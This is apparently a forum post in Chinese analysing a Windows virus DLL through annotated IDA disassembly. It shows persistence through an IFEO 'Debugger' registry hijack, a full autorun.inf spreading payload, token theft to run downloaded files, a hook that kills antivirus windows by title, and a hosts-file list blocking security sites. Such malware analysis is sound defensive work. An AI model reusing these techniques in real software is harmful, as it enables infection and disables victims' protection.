.text:71001D39                 cmp     eax, esi  
.text:71001D3B                 jz      short loc\_71001D85  
.text:71001D3D                 mov     \[esp+20h+var\_8\], offset lpSubKey  
.text:71001D45  
.text:71001D45 loc\_71001D45:                           ; CODE XREF: Create\_reg\_avpTo\_svchost+D9 j  
.text:71001D45                 push    esi             ; lpdwDisposition  
.text:71001D46                 lea     ecx, \[esp+24h+phkResult\]  
.text:71001D4A                 push    ecx             ; phkResult  
.text:71001D4B                 push    esi             ; lpSecurityAttributes  
.text:71001D4C                 push    edi             ; samDesired  
.text:71001D4D                 push    esi             ; dwOptions  
.text:71001D4E                 push    esi             ; lpClass  
.text:71001D4F                 push    esi             ; Reserved  
.text:71001D50                 push    eax             ; lpSubKey  
.text:71001D51                 push    \[esp+40h+hKey\]  ; hKey  
.text:71001D55                 call    ebx ; RegCreateKeyExA  
.text:71001D57                 push    0Ch             ; cbData  
.text:71001D59                 push    offset Data     ; "svchost.exe"  
.text:71001D5E                 push    1               ; dwType  
.text:71001D60                 push    esi             ; Reserved  
.text:71001D61                 push    offset ValueName ; "Debugger"  
.text:71001D66                 push    \[esp+34h+phkResult\] ; hKey  
.text:71001D6A                 call    ebp ; RegSetValueExA ; 让用户运行 avp(卡巴)时实际运行 svchost.exe  
.text:71001D6C                 push    \[esp+20h+phkResult\] ; hKey  
.text:71001D70                 call    ds:RegCloseKey  
.text:71001D76                 add     \[esp+20h+var\_8\], 4  
.text:71001D7B                 mov     eax, \[esp+20h+var\_8\]  
.text:71001D7F                 mov     eax, \[eax\]  
.text:71001D81                 cmp     eax, esi  
.text:71001D83                 jnz     short loc\_71001D45  
  
  
然后判断系统是否为 xp 或 2000 如果是则提升进程权限, 使用 ZwOpenSection 来得到\\device\\physicalmemory 的句柄,  
如果没有 SECTION\_MAP\_WRITE 权限则此调用会失败,如果失败则调用 ZwOpenSection 使用 READ\_CONTROL|WRITE\_DAC 访问标志来得到\\device\\physicalmemory 的另一个句柄.加入新的 DACL 到\\device\\physicalmemory 对象中,最后加入 DACL 到\\device\\physicalmemory 中并为管理员用户获得 SECTION\_MAP\_WRITE 访问权限.  
供后面直接读取物理内存用(vista 之后就不能在用户态直接访问了吧).  
相关代码:  
text:71001BFF                                         ; Open\_PhysicalMemory+4F j ...  
.text:71001BFF                 push    1               ; int  
.text:71001C01                 mov     ebp, offset aSesecuritypriv ; "SeSecurityPrivilege"  
.text:71001C06                 push    ebp             ; lpName  
.text:71001C07                 call    Raise\_Priv      ; 提权  
.text:71001C0C                 pop     ecx  
.text:71001C0D                 pop     ecx  
.text:71001C0E                 call    GetTwoNtdllFun\_ADDR ; 得到 RtlInitUnicodeString 和 ZwOpenSection 的地址  
.text:71001C13                 test    eax, eax  
.text:71001C15                 jz      loc\_71001CA3  
.text:71001C1B                 call    Open\_Device\_PhysicalMemory ; 打开并映射该对象,用于读写物理内存,xp 之后应该就不支持了吧在用户态  
.text:71001C20                 cmp     eax, 1  
.text:71001C23                 jnz     short loc\_71001C9E  
.text:71001C25                 push    0FFDFF124h  
.text:71001C2A                 call    Map\_device\_physicalmemorymory ; 映射\\device\\physicalmemory  
.text:71001C2F                 test    eax, eax  
.text:71001C31                 pop     ecx  
.text:71001C32                 jz      short loc\_71001C99  
.text:71001C34                 add     eax, 44h  
.text:71001C37                 push    eax  
.text:71001C38                 call    Map\_device\_physicalmemorymory  
  
线程 4:  
行为:首先判断当前操作系统版本,然后获得当前计算机网卡信息以及网络 IP 地址,然后格式化这些数据,在系统临时目录创建以随机数命名的 txt 文件.,并下载文件到临时目录的 txt 文件.由于地址以无效故不做深入分析.  
简略代码:  
text:71003716                 lea     eax, \[ebp+74h+String1\]  
.text:7100371C                 push    80h  
.text:71003721                 push    eax             ; lpString1  
.text:71003722                 call    Get\_System\_Version ; 获得当前操作系统版本  
.text:71003727                 xor     eax, eax  
.text:71003729                 mov     \[ebp+74h+var\_8\], bl  
.text:7100372C                 lea     edi, \[ebp+74h+var\_7\]  
.text:7100372F                 stosd  
.text:71003730                 stosb  
.text:71003731                 lea     eax, \[ebp+74h+var\_8\]  
.text:71003734                 push    eax  
.text:71003735                 call    Get\_IpAddress   ; 获得本机地址  
.text:7100373A                 push    1Fh  
.text:7100373C                 xor     eax, eax  
.text:7100373E                 pop     ecx  
.text:7100373F                 mov     \[ebp+74h+var\_8C\], bl  
.text:71003742                 lea     edi, \[ebp+74h+var\_8B\]  
.text:71003745                 rep stosd  
.text:71003747                 stosw  
.text:71003749                 stosb  
………省略  
.text:7100376B                 push    offset a\_2x\_2x\_2x\_2x\_2 ; "%.2X-%.2X-%.2X-%.2X-%.2X-%.2X"  
.text:71003770                 push    eax             ; LPSTR  
.text:71003771                 call    ds:wsprintfA    ; 格式化此地址  
text:71003891                 push    ebx  
.text:71003892                 push    ebx  
.text:71003893                 lea     eax, \[ebp+74h+Buffer\]  
.text:71003899                 push    eax  
.text:7100389A                 lea     eax, \[ebp+74h+var\_514\]  
.text:710038A0                 push    eax  
.text:710038A1                 push    ebx  
.text:710038A2                 call    \[ebp+74h+Addr\_URLDownloadToFile\] ; 调用 URLDownloadToFile  下载文件到 txt 中  
  
线程 5:  
由于网址都已无效,所以也不知道下载的什么故只简要一下过程  
行为分析:下载文件到系统临时目录,然后创建文件映射,把其映射到进程的地址空间中,然后在创建线程,  
可以认为是线程 6,下载文件到系统临时目录,提升进程权限,然后枚举当前进程,找到 explorer.exe 的进程 ID，之后得到 explorer.exe 的访问令牌环,然后使用这个 Token 作参数,调用 CreateProcessAsUser,创建进程并运行刚才下载的文件.  
  
相关代码:  
  
ext:710015DB                 push    ebp  
.text:710015DC                 mov     ebp, esp  
.text:710015DE                 sub     esp, 58h  
.text:710015E1                 push    ebx  
.text:710015E2                 push    esi  
.text:710015E3                 push    edi  
.text:710015E4                 push    offset aSedebugprivile ; "SeDebugPrivilege"  
.text:710015E9                 call    Raise\_Priv\_0  
.text:710015EE                 mov     \[esp+68h+var\_68\], offset aExplorer\_exe ; "explorer.exe"  
.text:710015F5                 call    IS\_Explorer     ; 当前进程中是否有 explorer.exe  
…..省略  
.text:71001604                 call    ds:OpenProcess  
.text:7100160A                 lea     ecx, \[ebp+hObject\]  
.text:7100160D                 push    ecx             ; TokenHandle  
.text:7100160E                 push    0Bh             ; DesiredAccess  
.text:71001610                 push    eax             ; ProcessHandle  
.text:71001611                 call    ds:OpenProcessToken  
…….省略  
.text:7100162A                 call    ds:GetStartupInfoA  
…….省略  
.text:71001660                 jnz     short loc\_7100166A ; 如果 OpenProcessToken 调用成功  
.text:71001662                 call    ds:CreateProcessA  
.text:71001668                 jmp     short loc\_71001673  
.text:7100166A ; ---------------------------------------------------------------------------  
.text:7100166A  
.text:7100166A loc\_7100166A:                           ; CODE XREF: Create\_Explorer\_exe+85 j  
.text:7100166A                 push    \[ebp+hObject\]   ; hToken  
.text:7100166D                 call    ds:CreateProcessAsUserA ; 以 explorer.exe 的访问控制权限创建一个进程，运行刚才下载的文件  
  
线程 7:  
行为分析:  
首先得到系统有效的磁盘驱动器盘符,然后排除盘符 A ,B.然后循环判断磁盘类型是否为固定硬盘和可移动硬盘(如 U 盘),如果是的话,就在相应文件下创建隐藏属性的 autorun.inf 文件并写入如下命令:  
\[autorun\]  
shell\\open\\command=rundll32 system.dll,explore  
shell\\explore\\command=rundll32 system.dll,explore  
即自动让资源管理器打开 rundll32.exe 并加载 system.dll.(system.dll 即为下面的病毒母体释放的 DLL 的一个副本)  
然后得到病毒 DLL 的路径(调用 GetModuleFileName 传入事先保存的 DLL 模块句柄所以此时得到的是 DLL 路径而非 EXE 路径),并复制到符合上面要求的磁盘目录下并命名为 system.dll.这样就完成了简单的自动加载病毒 DLL 功能.  
  
相关代码(省略无关代码):  
  
.text:71003B7C                 mov     ebp, offset aExplore\_0 ; "explore"  
.text:71003B81                 mov     esi, offset aSystem\_dll ; "system.dll"  
.text:71003B86  
.text:71003B86 loc\_71003B86:                           ; CODE XREF: Achieve\_Autorun+1CA j  
.text:71003B86                 lea     eax, \[esp+734h+Buffer\]  
.text:71003B8D                 push    eax             ; lpBuffer  
.text:71003B8E                 push    104h            ; nBufferLength  
.text:71003B93                 call    ds:GetLogicalDriveStringsA; 获得当前有效的驱动器  
……省略  
.text:71003BC8 ; ---------------------------------------------------------------------------  
.text:71003BC8  
.text:71003BC8 loc\_71003BC8:                           ; CODE XREF: Achieve\_Autorun+1B9 j  
.text:71003BC8                 mov     edi, \[esp+734h+lpString2\]  
.text:71003BCC  
.text:71003BCC loc\_71003BCC:                           ; CODE XREF: Achieve\_Autorun+54 j  
.text:71003BCC                 push    edi             ; lpRootPathName  
.text:71003BCD                 call    ds:GetDriveTypeA ; 排除盘符 A B  
.text:71003BD3                 mov     ebx, ds:lstrcmpiA  
.text:71003BD9                 push    offset aA       ; "A:\\\\"  
.text:71003BDE                 push    edi             ; lpString1  
.text:71003BDF                 mov     \[esp+73Ch+var\_71C\], eax  
.text:71003BE3                 call    ebx ; lstrcmpiA  
.text:71003BE5                 test    eax, eax  
.text:71003BE7                 jz      loc\_71003D15  
.text:71003BED                 push    offset aB       ; "B:\\\\"  
.text:71003BF2                 push    edi             ; lpString1  
.text:71003BF3                 call    ebx ; lstrcmpiA  
.text:71003BF5                 test    eax, eax  
.text:71003BF7                 jz      loc\_71003D15  
.text:71003BFD                 mov     eax, \[esp+734h+var\_71C\]  
.text:71003C01                 cmp     eax, dword\_7100711C ; 是否为可移动盘符  
.text:71003C07                 jz      short loc\_71003C15 ; 如果是可移动磁盘就在磁盘里创建 inf 文件  
.text:71003C09                 cmp     eax, dword\_71007120 ; 不可移动的硬盘驱动器(如 C 盘)也在里面粗昂见 inf 文件  
.text:71003C0F                 jnz     loc\_71003D15  
.text:71003C15  
.text:71003C15 loc\_71003C15:                           ; CODE XREF: Achieve\_Autorun+95 j  
.text:71003C15                 push    offset aAutorun ; 即如果为硬盘或者可移动磁盘如 U 盘之类的,就在其盘符目录下创建 inf 文件和 system.dll 文件  
.text:71003C1A                 push    edi  
.text:71003C1B                 lea     eax, \[esp+73Ch+FileName\]  
.text:71003C1F                 push    offset aSS\_inf  ; 拼接 inf 文件路径如 C:\\autorun.inf  
.text:71003C24                 push    eax             ; LPSTR  
.text:71003C25                 call    ds:wsprintfA  
.text:71003C2B                 add     esp, 10h  
.text:71003C2E                 push    6               ; dwFileAttributes  
.text:71003C30                 lea     eax, \[esp+738h+FileName\]  
.text:71003C34                 push    eax             ; lpFileName  
.text:71003C35                 call    ds:SetFileAttributesA;设置 inf 文件属性  
.text:71003C3B                 lea     eax, \[esp+734h+FileName\]  
.text:71003C3F                 push    eax             ; lpPathName  
.text:71003C40                 call    ds:RemoveDirectoryA; 移除原有的本文件  
.text:71003C46                 push    0               ; hTemplateFile  
.text:71003C48                 push    6               ; dwFlagsAndAttributes  
.text:71003C4A                 push    4               ; dwCreationDisposition  
.text:71003C4C                 push    0               ; lpSecurityAttributes  
.text:71003C4E                 push    7               ; dwShareMode  
.text:71003C50                 push    0C0000000h      ; dwDesiredAccess  
.text:71003C55                 lea     eax, \[esp+74Ch+FileName\]  
.text:71003C59                 push    eax             ; lpFileName  
.text:71003C5A                 call    ds:CreateFileA  ; 创建 inf 文件  
…..省略  
.text:71003C9C                 push    offset aSSOpenSSSSSSSS ; "\[%s\]\\r\\n%s\\\\open\\\\%s %s,%s\\r\\n%s\\\\%s\\\\%s %s,%s"  
.text:71003CA1                 push    eax             ; LPSTR  
.text:71003CA2                 call    ds:wsprintfA  
.text:71003CA8                 add     esp, 30h  
.text:71003CAB                 lea     eax, \[esp+734h+String\]  
.text:71003CB2                 push    eax             ; lpString  
.text:71003CB3                 call    ds:lstrlenA  
.text:71003CB9                 push    0               ; lpOverlapped  
.text:71003CBB                 lea     ecx, \[esp+738h+NumberOfBytesWritten\]  
.text:71003CBF                 push    ecx             ; lpNumberOfBytesWritten  
.text:71003CC0                 inc     eax  
.text:71003CC1                 push    eax             ; nNumberOfBytesToWrite  
.text:71003CC2                 lea     eax, \[esp+740h+String\]  
.text:71003CC9                 push    eax             ; lpBuffer  
.text:71003CCA                 push    ebx             ; hFile  
.text:71003CCB                 call    ds:WriteFile    ; 向 inf 文件写入命令  
…..省略  
.text:71003D0E                 push    eax             ; lpFileName  
.text:71003D0F                 call    CopyVirusDllToSystem\_dll ; 把此 DLL 复制为新文件,名字为 system.dll  
….省略  
CopyVirusDllToSystem\_dll 函数 比较简单,可以看 idb 文件很详细.  
  
线程 8:  
行为分析:  
首先获得系统目录,然后从资源中释放 appwinproc.dll 到系统目录中去,然后枚举进程,得到当前 explorer.exe 进程的信息,打开进程获得句柄,并使用远程线程的方式(CreateRemoteThread / Loadlibrary)让 explorer.exe 加载 appwinproc.dll,在虚拟机中,将时间改为 2008 年 12 月 30 日之前的任何一个时间，然后运行程序,在系统目录中找到 appwinproc.dll,然后载入 IDA 分析,可知,该 DLL 完成的功能是：  
首先用一全局变量做标志,防止多次同时加载这一 DLL,然后创建线程可以算做线程 9:  
线程功能是设置全局 windows 钩子,让所有有窗口的程序都会加载 appwinproc.dll,监控所有线程的 GetMessage 和 PostMessage.  
钩子函数的功能:首先得到消息源头的根窗口句柄,然后获得窗口标题,判断窗口标题是否和黑名单一致,如果一直,则调用 TerminateProcess 传递-1 作为当前进程的伪句柄,来结束符合进程.因为钩子函数就在符合黑名单的进程当中,所以可以使用伪句柄来作为进程句柄.我们经常使用的 GetCurrentProcess 就是返回-1,作为当前进程的伪句柄,只能在当前进程中使用.  
窗口标题黑名单:  
"sreng""Sreng""SRENG""木马""江民""杀毒""专杀""360 安全卫士""下载者""NOD32""卡巴斯基""金山毒霸""瑞星""McAfee""超级巡警""奇虎""瑞星卡卡"  
  
相关代码(只给出框架,其他的看 idb)：  
.text:710039F4                 push    104h            ; uSize  
.text:710039F9                 lea     eax, \[ebp+Buffer\]  
.text:710039FF                 push    eax             ; lpBuffer  
.text:71003A00                 call    ds:GetSystemDirectoryA  
.text:71003A06                 push    offset aAppwinproc\_dll ; "\\\\appwinproc.dll"  
.text:71003A0B                 lea     eax, \[ebp+Buffer\]  
.text:71003A11                 push    eax             ; lpString1  
.text:71003A12                 call    ds:lstrcatA  
.text:71003A18                 lea     eax, \[ebp+Buffer\]  
.text:71003A1E                 push    eax             ; lpFileName  
.text:71003A1F                 push    68h             ; nNumberOfBytesToWrite  
.text:71003A21                 push    offset Type     ; "RES"  
.text:71003A26                 push    hModule         ; hModule  
.text:71003A2C                 call    RES\_TO\_SYS      ; 释放 appwinproc.dll  
……  
.text:71003A34                 push    offset aExplorer\_exe ; "explorer.exe"  
.text:71003A39                 call    IS\_Explorer     ; 枚举进程找到 explorer.exe 进程  
.text:71003A3E                 mov     esi, eax  
.text:71003A40                 mov     \[esp+110h+var\_110\], 2710h  
.text:71003A47                 call    ds:Sleep  
.text:71003A4D                 test    esi, esi  
.text:71003A4F                 jz      short loc\_71003A34  
.text:71003A51                 push    esi             ; dwProcessId  
.text:71003A52                 push    0               ; bInheritHandle  
.text:71003A54                 push    10043Ah         ; dwDesiredAccess  
.text:71003A59                 call    ds:OpenProcess  
.text:71003A5F                 mov     esi, eax  
.text:71003A61                 test    esi, esi  
.text:71003A63                 jz      loc\_710039DD  
.text:71003A69                 lea     eax, \[ebp+Buffer\]  
.text:71003A6F                 push    eax             ; lpBuffer  刚刚释放的 DLL 名  
.text:71003A70                 push    esi             ; hProcess  
.text:71003A71                 call    MakeSvchost\_Load\_DLL ; 此处命名是根据前几个线程,所以此处的功能是让 explorer.exe 加载刚刚释放的 DLL  
  
Appwinproc.dll 的相关代码:  
  nop  
.text:10001111                 push    0               ; dwThreadId  
.text:10001113                 push    hmod            ; hmod  
.text:10001119                 push    offset fn       ; lpfn  
.text:1000111E                 push    3     ; idHook------WH\_GETMESSAGE 监控 GetMessage 和 PostMessge 消息  
.text:10001120                 call    ds:SetWindowsHookExA ; 设置全局钩子  
.text:10001126                 mov     ds:hhk, eax  
…省略  
钩子过程函数:  
.text:100010C3                 call    ds:GetAncestor  ; 得到消息发送者或者接受者目标窗口根句柄  
.text:100010C9                 push    200h            ; nMaxCount  
.text:100010CE                 lea     ecx, \[ebp+String\]  
.text:100010D4                 push    ecx             ; lpString  
.text:100010D5                 push    eax             ; hWnd  
.text:100010D6                 call    ds:GetWindowTextA ; 获得窗口标题  
.text:100010DC                 lea     eax, \[ebp+String\]  
.text:100010E2                 push    eax  
.text:100010E3                 call    IS\_TO\_KILL      ; 判断标题是否与黑名单相同,如果相同返回非 0 值  
.text:100010E8                 test    eax, eax  
.text:100010EA                 pop     ecx  
.text:100010EB                 pop     edi  
.text:100010EC                 jz      short loc\_100010F8  
.text:100010EE                 push    0               ; uExitCode  
.text:100010F0                 push    -1              ; hProcess 表示当前进程的伪句柄  
.text:100010F2                 call    ds:TerminateProcess ; 符合则调用 TerminateProcess 结束掉  
  
线程 10:  
行为分析:  
首先获得系统目录,然后在其目下的\\drivers\\etc 创建或打开 hosts 文件,修改其属性可读可写,  
然后移动文件指针到文件头,使用 host 域名劫持手段,来屏蔽相关安全网站的域名.即向该文件中写入: 127.0.0.1  要屏蔽的安全网址 ，即当我们访问这些网址时,浏览器会解析成 127.0.0.1 所以这样就不能访问这些网址.  
劫持的域名黑名单:  
  
"www.360.cn""www.360safe.cn""www.360safe.com""www.chinakv.com""www.rising.com.cn"  
"rising.com.cn""dl.jiangmin.com""jiangmin.com""www.jiangmin.com""www.duba.net"  
"www.eset.com.cn""www.nod32.com""shadu.duba.net""union.kingsoft.com""www.kaspersky.com.cn""kaspersky.com.cn""virustotal.com""www.kaspersky.com""www.cnnod32.cn""www.lanniao.org"  
"www.nod32club.com""www.dswlab.com""bbs.sucop.com""www.virustotal.com""tool.ikaka.com"  
"360.qihoo.com"  
  
主要代码:  
.text:71003D71                 call    ds:GetSystemDirectoryA  
.text:71003D77                 push    offset aDriversEtcHost ; "\\\\drivers\\\\etc\\\\hosts"  
.text:71003D7C                 lea     eax, \[ebp+FileName\]  
.text:71003D82                 push    eax             ; lpString1  
.text:71003D83                 call    ds:lstrcatA     ; 拼接 host 文件路径如:C:\\WINDOWS\\system32\\drivers\\etc\\hosts  
.text:71003D89                 mov     esi, 80h  
.text:71003D8E                 push    esi             ; dwFileAttributes  
.text:71003D8F                 lea     eax, \[ebp+FileName\]  
.text:71003D95                 push    eax             ; lpFileName  
.text:71003D96                 call    ds:SetFileAttributesA ; 设置可读可写  
.text:71003D9C                 push    ebx             ; hTemplateFile  
.text:71003D9D                 push    esi             ; dwFlagsAndAttributes  
.text:71003D9E                 push    4               ; dwCreationDisposition--------OPEN\_ALWAYS  
.text:71003DA0                 push    ebx             ; lpSecurityAttributes  
.text:71003DA1                 push    1               ; dwShareMode  
.text:71003DA3                 push    40000000h       ; dwDesiredAccess  
.text:71003DA8                 lea     eax, \[ebp+FileName\]  
.text:71003DAE                 push    eax             ; lpFileName  
.text:71003DAF                 call    ds:CreateFileA  ; 打开或者创建该 host 文件  
….省略  
.text:71003DCA                 mov     esi, offset off\_71007540 ; 劫持的网址字符串数组  
.text:71003DCF  
.text:71003DCF loc\_71003DCF:                           ; CODE XREF: Create\_Host+CC j  
.text:71003DCF                 push    eax  
.text:71003DD0                 lea     eax, \[ebp+String\]  
.text:71003DD6                 push    offset a127\_0\_0\_1S ; "127.0.0.1 %s\\r\\n"  
.text:71003DDB                 push    eax             ; LPSTR  
.text:71003DDC                 call    ds:wsprintfA    ; 拼接字符串 如:127.0.0.1 安全网址  
….省略  
.text:71003E00                 call    ds:WriteFile    ; 写入文件  
.text:71003E06                 add     esi, 4  
.text:71003E09                 mov     eax, \[esi\]  
.text:71003E0B                 cmp     eax, ebx  
.text:71003E0D                 jnz     short loc\_71003DCF  
  
线程 11:  
行为分析:  
首先映射病毒母体释放的 DLL 到 svchost.exe 进程空间中,为后面修改系统 DLL 做准备.  
然后在系统目录下生产 5 个驱动并以服务方式加载到内核并执行,这 5 个驱动分别是 Nspass0.sys, Nspass1.sys, Nspass2.sys, Nspass3.sys, Nspass4.sys.  
能力有限只是简单对这 5 个驱动用 IDA F5 看了下,其中 NsPass0.sys 使用病毒母体的 DLL 在进程中的映像,来修改系统目录下的 schedsvc.dll,  
NsPass1.sys 使用它修改系统目录下的 appmgmts.dll, NsPass2.sys 使用它修改系统目录下的 srsvc.dll, NsPass3.sys 使用它修改系统目录下的 w32time.dll,NsPass4.sys 使用它修改系统目录下的 wiaservc.dll 具体怎么用病毒 DLL 修改这几个系统 DLL,可以自己逆下,这几个驱动,我只是 F5 看了下,毕竟精力有限,能力也有限.^\_^  
  
相关代码:  
  
.text:710025AD                 push    eax  
.text:710025AE                 lea     eax, \[ebp+var\_8\]  
.text:710025B1                 push    eax  
.text:710025B2                 call    MAP\_DLL         ; 映射病毒母体释放的 DLL 到 svchost.exe 的进程地址空间中  
.text:710025B7                 and     \[ebp+String2\], 0  
.text:710025BF                 pop     ecx             ; 平衡堆栈  
.text:710025C0                 pop     ecx  
.text:710025C1                 mov     \[ebp+lpInBuffer\], eax ; 此处有点危险,返回的是局部指针变量并使用  
….略  
.text:710025EA                 call    ds:GetModuleFileNameW ; 得到病毒母体 DLL 路径  
.text:710025F0                 and     \[ebp+String1\], 0  
.text:710025F8                 xor     eax, eax  
.text:710025FA                 mov     ecx, esi  
.text:710025FC                 lea     edi, \[ebp+var\_20E\]  
.text:71002602                 rep stosd  
.text:71002604                 stosw  
.text:71002606                 xor     edi, edi  
.text:71002608                 cmp     off\_71007524, edi ; 比较字符串数组指针是否为 NULL  
.text:7100260E                 jz      short loc\_71002664  
.text:71002610                 mov     eax, offset off\_71007524 ; 字符串数组首地址，5 个 DLL 的名字  
.text:71002615                 mov     esi, eax  
.text:71002617  
.text:71002617 loc\_71002617:                           ; CODE XREF: RES\_TO\_SYS\_LOAD+C4 j  
.text:71002617                 push    ebx             ; for 循环  
.text:71002618                 lea     ecx, \[ebp+String1\]  
.text:7100261E                 push    ecx             ; lpString1  
.text:7100261F                 push    dword ptr \[eax\] ; lpString2-----字符串数组中预先保存的 5 个 DLL 名  
.text:71002621                 call    STRCAT\_FILEPATH ; 拼接 DLL 文件路径  
.text:71002626                 add     esp, 0Ch  
.text:71002629                 lea     eax, \[ebp+String2\]  
.text:7100262F                 push    eax             ; lpString2  
.text:71002630                 lea     eax, \[ebp+String1\]  
.text:71002636                 push    eax             ; lpString1  
.text:71002637                 call    ds:lstrcmpiW  
.text:7100263D                 test    eax, eax  
.text:7100263F                 jz      short loc\_71002659 ; 地址加 4 也就寻址下一个字符串即 5 个 DLL 的名字  
.text:71002641                 push    0A400h          ; nInBufferSize  
.text:71002646                 push    \[ebp+lpInBuffer\] ; lpInBuffer DLL 路径  
.text:71002649                 lea     eax, \[ebp+String1\]  
.text:7100264F                 push    edi             ; int  0-4  
.text:71002650                 push    eax             ; lpString2  
.text:71002651                 call    Release\_PassSys\_LoadIt ; 释放 NsPass0.sys 到 NsPass4.sys 这 5 个驱动文件并加载到内核,通信并修改数组中保存的那 5 个系统 DLL  
.text:71002656                 add     esp, 10h  
.text:71002659  
.text:71002659 loc\_71002659:                           ; CODE XREF: RES\_TO\_SYS\_LOAD+A1 j  
.text:71002659                 add     esi, 4          ; 地址加 4 也就寻址下一个字符串即 5 个 DLL 的名字  
.text:7100265C                 inc     edi             ; 从 0 开始自加,是个 for 循环，所以 edi 的从 0 到 4 的取值  
.text:7100265D                 cmp     dword ptr \[esi\], 0  
.text:71002660                 mov     eax, esi  
.text:71002662                 jnz     short loc\_71002617  
  
线程 12:  
行为分析:  
首先 Sleep 一段时间,然后又创建 2 个线程,,这两个线程完成的功能和线程 5 与线程 4 一样,故不做分析,在 idb 中有详细注释.  
  
上传 idb 文件,里面注释很详细,基本上把所有函数都逆了.

上传的附件
| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) || idb&分析文档.rar  
 |